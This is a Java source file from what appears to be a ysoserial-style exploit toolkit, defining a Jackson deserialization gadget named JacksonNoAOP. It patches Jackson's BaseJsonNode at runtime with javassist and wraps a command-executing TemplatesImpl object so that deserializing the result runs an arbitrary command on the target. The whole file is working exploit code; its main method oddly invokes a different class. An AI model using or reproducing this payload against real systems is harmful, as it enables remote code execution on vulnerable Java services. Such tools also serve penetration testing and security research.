package com.h2tg.ysogate.payloads.gadgets;

import com.fasterxml.jackson.databind.node.POJONode;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.bullet.jdk.GXString;
import com.h2tg.ysogate.utils.Gadgets;
import com.h2tg.ysogate.utils.PayloadRunner;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.springframework.aop.framework.AdvisedSupport;

import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;

@SuppressWarnings({"rawtypes"})
@Dependencies({"com.fasterxml.jackson.core:jackson-databind:2.14.2", "org.springframework:spring-aop:4.1.4.RELEASE"})
public class JacksonNoAOP implements CommandObjectPayload<Object>
{
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Jackson2.class, args);
    }

    public Object getObject(final String command) throws Exception {
        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        try {
            CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
            ctClass.removeMethod(writeReplace);
            ctClass.toClass();
        } catch (Exception e) {
            // ignore
        }
        POJONode node = new POJONode(Gadgets.createTemplates4Cmd(command));
        GXString gxString = new GXString();
        return gxString.readObjectToString(node);
    }
}
